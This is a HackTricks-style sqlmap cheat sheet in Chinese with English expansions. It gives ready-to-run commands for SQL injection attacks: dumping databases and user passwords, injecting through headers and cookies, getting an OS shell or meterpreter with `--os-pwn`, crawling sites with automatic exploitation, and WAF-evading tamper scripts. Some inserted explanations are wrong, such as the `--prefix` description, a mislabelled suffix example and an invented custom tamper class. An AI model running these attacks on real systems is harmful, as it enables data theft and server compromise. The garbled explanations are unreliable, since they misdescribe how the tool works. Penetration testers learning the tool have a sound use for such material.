<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


# SQLmap的基本参数

## 通用参数
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=PROXY
```
## 检索信息

### 内部信息
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
```
### 数据库数据

```plaintext
sqlmap -u "http://example.com/page.php?id=1" --dump
```

使用上述命令，可以使用sqlmap工具来获取目标网站上的数据库数据。将`http://example.com/page.php?id=1`替换为目标网站的URL，并使用`--dump`参数执行命令。

此命令将扫描目标网站上的SQL注入漏洞，并尝试提取数据库中的数据。成功执行后，将显示数据库中的数据。
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
# 注入位置

## 从Burp/ZAP捕获

捕获请求并创建一个req.txt文件
```bash
sqlmap -r req.txt --current-user
```
## GET请求注入

### Introduction

### 介绍

GET请求注入是一种利用Web应用程序中的漏洞来执行SQL注入攻击的技术。通过在GET请求的参数中注入恶意的SQL代码，攻击者可以绕过应用程序的输入验证，直接与数据库进行交互，并执行恶意操作。

### Basic Usage

### 基本用法

要使用GET请求注入进行SQL注入攻击，可以使用工具如SQLMap。SQLMap是一款功能强大的自动化SQL注入工具，可以帮助我们发现和利用Web应用程序中的SQL注入漏洞。

以下是使用SQLMap进行GET请求注入的基本步骤：

1. 识别目标URL中的注入点：使用SQLMap的`-u`参数指定目标URL，并使用`--dbs`参数检测是否存在注入点。

2. 确定注入点的数据库类型：使用SQLMap的`--dbms`参数指定目标数据库的类型。

3. 执行注入攻击：使用SQLMap的`--level`和`--risk`参数设置注入攻击的级别和风险，并使用`--dump`参数获取数据库中的数据。

### Advanced Usage

### 高级用法

除了基本用法之外，还可以使用SQLMap的其他功能来进行更高级的GET请求注入攻击。

以下是一些SQLMap的高级用法示例：

- 使用`--tamper`参数来绕过WAF（Web应用程序防火墙）的检测。

- 使用`--proxy`参数通过代理服务器进行注入攻击。

- 使用`--threads`参数设置并发线程数，加快注入攻击的速度。

- 使用`--os-shell`参数获取目标服务器的操作系统Shell访问权限。

### Conclusion

### 结论

GET请求注入是一种常见的SQL注入攻击技术，可以通过注入恶意的SQL代码来绕过Web应用程序的输入验证，并执行恶意操作。使用工具如SQLMap可以帮助我们自动化地发现和利用这种漏洞，但在进行任何攻击之前，请确保已经获得合法的授权。
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
## POST请求注入

In some cases, the target application may use POST requests to send data to the server. This can be a common scenario for login forms or data submission forms. In these cases, an attacker can attempt to inject malicious SQL code into the POST parameters to exploit SQL injection vulnerabilities.

在某些情况下，目标应用程序可能使用POST请求将数据发送到服务器。这在登录表单或数据提交表单中是常见的情况。在这些情况下，攻击者可以尝试将恶意的SQL代码注入到POST参数中，以利用SQL注入漏洞。

To perform a POST request injection, you can use the `--data` option in SQLMap. This option allows you to specify the POST data to be sent to the server. You can provide the POST data either directly or by using a file.

要执行POST请求注入，您可以在SQLMap中使用`--data`选项。该选项允许您指定要发送到服务器的POST数据。您可以直接提供POST数据，也可以使用文件。

Here is an example of how to use the `--data` option with SQLMap:

以下是如何在SQLMap中使用`--data`选项的示例：

```plaintext
sqlmap -u "http://example.com/login" --data "username=admin&password=test" --method POST
```

In this example, we are targeting the login page of `http://example.com` and injecting the POST parameters `username` and `password` with the values `admin` and `test`, respectively.

在此示例中，我们针对`http://example.com`的登录页面，并分别使用值`admin`和`test`注入POST参数`username`和`password`。

SQLMap will automatically detect and exploit any SQL injection vulnerabilities in the POST parameters. It will analyze the server's response and attempt to extract information from the database.

SQLMap将自动检测和利用POST参数中的任何SQL注入漏洞。它将分析服务器的响应，并尝试从数据库中提取信息。

Remember to always obtain proper authorization before performing any penetration testing activities.

在执行任何渗透测试活动之前，请务必获得适当的授权。
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
## 头部和其他HTTP方法的注入

In addition to injecting payloads in the URL parameters, SQL injection can also occur in the headers and other HTTP methods. This can be exploited by manipulating the values of headers such as `User-Agent`, `Referer`, `Cookie`, and `Host`.

除了在URL参数中注入有效载荷外，SQL注入还可以发生在头部和其他HTTP方法中。这可以通过操纵头部的值，如`User-Agent`、`Referer`、`Cookie`和`Host`来利用。

### User-Agent Header

The `User-Agent` header is used by the client to identify itself to the server. It contains information about the client's operating system, browser, and other details. An attacker can manipulate the `User-Agent` header to inject SQL payloads.

### User-Agent头部

`User-Agent`头部由客户端用于向服务器标识自己。它包含有关客户端操作系统、浏览器和其他详细信息的信息。攻击者可以操纵`User-Agent`头部来注入SQL有效载荷。

### Referer Header

The `Referer` header specifies the URL from which the client accessed the current page. It can be manipulated by an attacker to inject SQL payloads.

### Referer头部

`Referer`头部指定了客户端访问当前页面的URL。攻击者可以操纵`Referer`头部来注入SQL有效载荷。

### Cookie Header

The `Cookie` header contains information about the client's session. It can be manipulated by an attacker to inject SQL payloads.

### Cookie头部

`Cookie`头部包含有关客户端会话的信息。攻击者可以操纵`Cookie`头部来注入SQL有效载荷。

### Host Header

The `Host` header specifies the domain name of the server. It can be manipulated by an attacker to inject SQL payloads.

### Host头部

`Host`头部指定了服务器的域名。攻击者可以操纵`Host`头部来注入SQL有效载荷。

### Other HTTP Methods

In addition to GET and POST requests, other HTTP methods such as PUT, DELETE, and OPTIONS can also be vulnerable to SQL injection. Attackers can manipulate the payloads in these methods to inject SQL code.

### 其他HTTP方法

除了GET和POST请求之外，其他HTTP方法（如PUT、DELETE和OPTIONS）也可能容易受到SQL注入的攻击。攻击者可以操纵这些方法中的有效载荷来注入SQL代码。
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
## 二次注入

Second order injection is a type of SQL injection attack that occurs when user input is not directly used in a SQL query, but is stored in a database and later used in a query. This can happen when user input is stored in a database and then concatenated with a SQL query without proper sanitization or validation.

二次注入是一种SQL注入攻击类型，当用户输入不直接用于SQL查询，而是存储在数据库中并在后续查询中使用时发生。这可能发生在用户输入存储在数据库中，然后与SQL查询连接而没有进行适当的清理或验证。

For example, let's say a web application allows users to submit comments, which are then stored in a database. Later, when displaying the comments, the application retrieves them from the database and includes them in a SQL query without proper sanitization. An attacker can then manipulate their comment to include malicious SQL code, which will be executed when the application retrieves and uses the comment in a query.

例如，假设一个Web应用程序允许用户提交评论，这些评论随后存储在数据库中。稍后，在显示评论时，应用程序从数据库中检索它们并将它们包含在一个SQL查询中，而没有进行适当的清理。攻击者可以操纵他们的评论，包含恶意的SQL代码，当应用程序检索并在查询中使用评论时，该代码将被执行。

To exploit a second order injection vulnerability, an attacker needs to understand how the application stores and retrieves user input from the database. They can then craft a payload that will be stored in the database and later executed as part of a query.

要利用二次注入漏洞，攻击者需要了解应用程序如何将用户输入存储到数据库中并从中检索。然后，他们可以构造一个有效负载，该有效负载将存储在数据库中，并在后续查询中作为一部分执行。

To prevent second order injection attacks, it is important to properly sanitize and validate all user input before using it in a SQL query. This can be done by using parameterized queries or prepared statements, which separate the SQL code from the user input and automatically handle the sanitization and validation.

为了防止二次注入攻击，重要的是在使用用户输入进行SQL查询之前，正确清理和验证所有用户输入。可以通过使用参数化查询或预处理语句来实现这一点，这些查询将SQL代码与用户输入分离，并自动处理清理和验证。

In conclusion, second order injection is a type of SQL injection attack that occurs when user input is stored in a database and later used in a query without proper sanitization. To prevent this type of attack, it is important to properly sanitize and validate all user input before using it in a SQL query.
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
## Shell

A shell is a command-line interface that allows users to interact with the operating system. It provides a way to execute commands, run scripts, and manage files and directories. In the context of hacking, a shell is often used to gain unauthorized access to a target system.

There are different types of shells, including:

- **Reverse Shell**: A reverse shell is a shell that connects back to the attacker's machine. It allows the attacker to execute commands on the target system remotely.

- **Bind Shell**: A bind shell is a shell that listens for incoming connections on a specific port. When a connection is established, the attacker gains control over the target system.

- **Web Shell**: A web shell is a shell that is uploaded to a vulnerable web application. It allows the attacker to execute commands on the web server.

Shells can be used for various purposes during a penetration test, such as:

- **Command Execution**: Shells can be used to execute commands on the target system, allowing the attacker to perform actions like file manipulation, privilege escalation, and data exfiltration.

- **Pivoting**: Shells can be used to pivot through a compromised system and gain access to other systems on the network.

- **Persistence**: Shells can be used to establish persistent access to a target system, allowing the attacker to maintain control even after the initial compromise.

To obtain a shell, an attacker may exploit vulnerabilities in a target system, such as a remote code execution vulnerability or a misconfigured web application. Once a shell is obtained, the attacker can use it to further exploit the target system and achieve their objectives.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
## 使用SQLmap自动化地爬取网站并进行利用

SQLmap is a powerful tool for automating SQL injection attacks. In addition to exploiting SQL injection vulnerabilities, it can also be used to crawl a website and automatically exploit any SQL injection vulnerabilities it finds.

SQLmap是一款强大的工具，用于自动化执行SQL注入攻击。除了利用SQL注入漏洞外，它还可以用于爬取网站并自动利用发现的任何SQL注入漏洞。

To crawl a website with SQLmap, you can use the `--crawl` option followed by the depth of the crawl. For example, to crawl a website up to a depth of 3, you would use the following command:

要使用SQLmap爬取网站，可以使用`--crawl`选项，后面跟着爬取的深度。例如，要爬取一个深度为3的网站，可以使用以下命令：

```bash
sqlmap -u http://example.com --crawl=3
```

This command tells SQLmap to start crawling the website at the given URL and follow any links it finds up to a depth of 3.

这个命令告诉SQLmap从给定的URL开始爬取网站，并在深度为3的范围内跟踪任何发现的链接。

During the crawl, SQLmap will automatically test each parameter and form for SQL injection vulnerabilities. If it finds any vulnerabilities, it will attempt to exploit them.

在爬取过程中，SQLmap将自动测试每个参数和表单是否存在SQL注入漏洞。如果发现任何漏洞，它将尝试利用它们。

To enable automatic exploitation of SQL injection vulnerabilities, you can use the `--batch` option. This option tells SQLmap to automatically exploit any vulnerabilities it finds without prompting for confirmation.

要启用对SQL注入漏洞的自动利用，可以使用`--batch`选项。该选项告诉SQLmap在发现漏洞时自动利用，而无需提示确认。

```bash
sqlmap -u http://example.com --crawl=3 --batch
```

With the `--batch` option, SQLmap will automatically exploit any SQL injection vulnerabilities it finds during the crawl without requiring any user interaction.

使用`--batch`选项，SQLmap将在爬取过程中自动利用发现的任何SQL注入漏洞，而无需任何用户交互。

By combining the `--crawl` and `--batch` options, you can automate the process of crawling a website and exploiting any SQL injection vulnerabilities that are discovered.

通过结合`--crawl`和`--batch`选项，可以自动化地爬取网站并利用发现的任何SQL注入漏洞的过程。
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
# 设置后缀

By default, SQLMap injects payloads at the end of the original query. However, you can customize the injection by setting a suffix. This allows you to inject payloads at a specific location within the query.

默认情况下，SQLMap将负载注入到原始查询的末尾。然而，您可以通过设置后缀来自定义注入。这样可以让您在查询中的特定位置注入负载。

To set a suffix, use the `--suffix` option followed by the desired payload. For example:

要设置后缀，请使用`--suffix`选项，后跟所需的负载。例如：

```
sqlmap -u "http://example.com/page.php?id=1" --suffix=" UNION SELECT NULL, NULL, 'injected'"
```

This command injects the payload `' UNION SELECT NULL, NULL, 'injected'` after the original query.

此命令在原始查询之后注入负载`' UNION SELECT NULL, NULL, 'injected'`。

## Set a prefix
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
## 前缀

### Description

### 描述

The `--prefix` option allows you to specify a prefix to be used in all database table names during the SQL injection attack. This can be useful when the target application uses a common prefix for all its tables.

`--prefix`选项允许您在SQL注入攻击期间指定一个前缀，以用于所有数据库表名。当目标应用程序对所有表使用一个常见的前缀时，这将非常有用。

### Syntax

### 语法

```plaintext
--prefix=<prefix>
```

### Example

### 示例

```plaintext
sqlmap -u "http://example.com/page.php?id=1" --prefix=app_
```

### Remarks

### 备注

In the above example, the `--prefix` option is used to specify the prefix `app_` to be used in all table names during the SQL injection attack.

在上面的示例中，`--prefix`选项用于指定在SQL注入攻击期间在所有表名中使用的前缀`app_`。
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
## 帮助找到布尔注入

Boolean-based SQL injection is a technique used to exploit vulnerabilities in web applications that use SQL queries. It involves manipulating the application's input to inject SQL statements that return a boolean value (true or false). This can be used to extract information from the database or bypass authentication mechanisms.

To find boolean-based injection vulnerabilities, you can use tools like SQLMap. SQLMap is a powerful open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.

Here are the steps to find boolean injection using SQLMap:

1. Identify the vulnerable parameter: Start by identifying the parameter in the web application that is vulnerable to SQL injection. This can be done by manually testing the application or using tools like Burp Suite.

2. Use SQLMap to detect boolean injection: Once you have identified the vulnerable parameter, you can use SQLMap to automatically detect if it is susceptible to boolean-based SQL injection. Run the following command:

   ```
   sqlmap -u <URL> --data "<POST data>" --level 5 --risk 3 --technique B
   ```

   Replace `<URL>` with the target URL and `<POST data>` with the POST data containing the vulnerable parameter.

3. Analyze the results: SQLMap will analyze the response from the server and determine if the parameter is vulnerable to boolean-based injection. It will also attempt to extract data from the database using various techniques.

4. Exploit the vulnerability: If SQLMap confirms the presence of a boolean-based injection vulnerability, you can proceed to exploit it further. SQLMap provides various options to extract data, such as dumping the database, retrieving specific tables, or extracting individual columns.

Remember to always obtain proper authorization before performing any penetration testing activities.
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
## 篡改

Tampering is a technique used to modify the behavior of SQLMap during the injection process. It allows you to customize the payloads sent to the target application and manipulate the SQL queries generated by SQLMap.

篡改是一种在注入过程中修改SQLMap行为的技术。它允许您自定义发送到目标应用程序的有效载荷，并操纵SQLMap生成的SQL查询。


### Available Tamper Scripts

### 可用的篡改脚本

SQLMap provides a wide range of tamper scripts that can be used to modify the payloads and evade detection. These scripts can be found in the `tamper` directory of the SQLMap installation.

SQLMap提供了各种篡改脚本，可用于修改有效载荷并规避检测。这些脚本可以在SQLMap安装的`tamper`目录中找到。

To use a tamper script, you can specify it using the `--tamper` option followed by the script name. For example:

要使用篡改脚本，您可以使用`--tamper`选项指定脚本名称。例如：

```
sqlmap -u http://example.com/index.php?id=1 --tamper=space2comment
```

This command will use the `space2comment` tamper script to convert spaces to comments in the injected SQL queries.

此命令将使用`space2comment`篡改脚本将空格转换为注释在注入的SQL查询中。

### Custom Tamper Scripts

### 自定义篡改脚本

In addition to the built-in tamper scripts, you can also create your own custom tamper scripts. These scripts are written in Python and can be used to implement custom payload modifications.

除了内置的篡改脚本，您还可以创建自己的自定义篡改脚本。这些脚本是用Python编写的，可用于实现自定义有效载荷修改。

To create a custom tamper script, you need to define a class that inherits from the `Tamper` class provided by SQLMap. This class should implement the `tamper` method, which takes the original payload as input and returns the modified payload.

要创建自定义篡改脚本，您需要定义一个继承自SQLMap提供的`Tamper`类的类。该类应该实现`tamper`方法，该方法以原始有效载荷作为输入，并返回修改后的有效载荷。

Here is an example of a custom tamper script that converts all characters to uppercase:

以下是将所有字符转换为大写的自定义篡改脚本示例：

```python
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
from lib.core.convert import to_unicode

class UppercaseTamper(object):
    def tamper(self, payload, **kwargs):
        return to_unicode(payload).upper().encode(UNICODE_ENCODING)

    def priority(self):
        return PRIORITY.NORMAL
```

To use this custom tamper script, you can save it as a Python file (e.g., `uppercase.py`) and specify it using the `--tamper` option:

要使用此自定义篡改脚本，您可以将其保存为Python文件（例如`uppercase.py`），并使用`--tamper`选项指定它：

```
sqlmap -u http://example.com/index.php?id=1 --tamper=uppercase
```

This command will use the `uppercase` tamper script to convert all characters in the payload to uppercase before injecting it into the SQL queries.

此命令将使用`uppercase`篡改脚本将有效载荷中的所有字符转换为大写，然后将其注入到SQL查询中。
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper | 描述 |
| :--- | :--- |
| apostrophemask.py | 将撇号字符替换为其UTF-8全角对应字符 |
| apostrophenullencode.py | 将撇号字符替换为其非法的双Unicode对应字符 |
| appendnullbyte.py | 在负载末尾附加编码的NULL字节字符 |
| base64encode.py | 对给定负载中的所有字符进行Base64编码 |
| between.py | 将大于运算符（'&gt;'）替换为'NOT BETWEEN 0 AND \#' |
| bluecoat.py | 将SQL语句后的空格字符替换为有效的随机空白字符。然后将字符'='替换为LIKE运算符 |
| chardoubleencode.py | 对给定负载中的所有字符进行双重URL编码（不处理已编码的字符） |
| commalesslimit.py | 将类似'LIMIT M, N'的实例替换为'LIMIT N OFFSET M' |
| commalessmid.py | 将类似'MID(A, B, C)'的实例替换为'MID(A FROM B FOR C)' |
| concat2concatws.py | 将类似'CONCAT(A, B)'的实例替换为'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' |
| charencode.py | 对给定负载中的所有字符进行URL编码（不处理已编码的字符） |
| charunicodeencode.py | 对给定负载中的未编码字符进行Unicode URL编码（不处理已编码的字符）。"%u0022" |
| charunicodeescape.py | 对给定负载中的未编码字符进行Unicode URL编码（不处理已编码的字符）。"\u0022" |
| equaltolike.py | 将所有等于运算符（'='）的出现替换为LIKE运算符 |
| escapequotes.py | 斜杠转义引号（'和"） |
| greatest.py | 将大于运算符（'&gt;'）替换为其GREATEST对应字符 |
| halfversionedmorekeywords.py | 在每个关键字之前添加有版本的MySQL注释 |
| ifnull2ifisnull.py | 将类似'IFNULL(A, B)'的实例替换为'IF(ISNULL(A), B, A)' |
| modsecurityversioned.py | 使用有版本的注释包围完整查询 |
| modsecurityzeroversioned.py | 使用零版本的注释包围完整查询 |
| multiplespaces.py | 在SQL关键字周围添加多个空格 |
| nonrecursivereplacement.py | 将预定义的SQL关键字替换为适合替换的表示形式（例如.replace\("SELECT", ""\)\）过滤器 |
| percentage.py | 在每个字符前添加百分比符号（'%'） |
| overlongutf8.py | 转换给定负载中的所有字符（不处理已编码的字符） |
| randomcase.py | 将每个关键字字符替换为随机大小写值 |
| randomcomments.py | 在SQL关键字中添加随机注释 |
| securesphere.py | 追加特殊制作的字符串 |
| sp\_password.py | 在负载末尾追加'sp\_password'以自动混淆DBMS日志 |
| space2comment.py | 将空格字符（' '）替换为注释 |
| space2dash.py | 将空格字符（' '）替换为破折号注释（'--'），后跟随机字符串和换行符（'\n'） |
| space2hash.py | 将空格字符（' '）替换为井号字符（'\#'），后跟随机字符串和换行符（'\n'） |
| space2morehash.py | 将空格字符（' '）替换为井号字符（'\#'），后跟随机字符串和换行符（'\n'） |
| space2mssqlblank.py | 将空格字符（' '）替换为来自有效备用字符集的随机空白字符 |
| space2mssqlhash.py | 将空格字符（' '）替换为井号字符（'\#'），后跟换行符（'\n'） |
| space2mysqlblank.py | 将空格字符（' '）替换为来自有效备用字符集的随机空白字符 |
| space2mysqldash.py | 将空格字符（' '）替换为破折号注释（'--'），后跟换行符（'\n'） |
| space2plus.py | 将空格字符（' '）替换为加号（'+'） |
| space2randomblank.py | 将空格字符（' '）替换为来自有效备用字符集的随机空白字符 |
| symboliclogical.py | 将AND和OR逻辑运算符替换为其符号对应字符（&&和\|） |
| unionalltounion.py | 将UNION ALL SELECT替换为UNION SELECT |
| unmagicquotes.py | 将引号字符（'）替换为多字节组合%bf%27，后跟通用注释（使其起作用） |
| uppercase.py | 将每个关键字字符替换为大写值'INSERT' |
| varnish.py | 追加HTTP头'X-originating-IP' |
| versionedkeywords.py | 使用有版本的MySQL注释括起每个非函数关键字 |
| versionedmorekeywords.py | 使用有版本的MySQL注释括起每个关键字 |
| xforwardedfor.py | 追加伪造的HTTP头'X-Forwarded-For' |



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
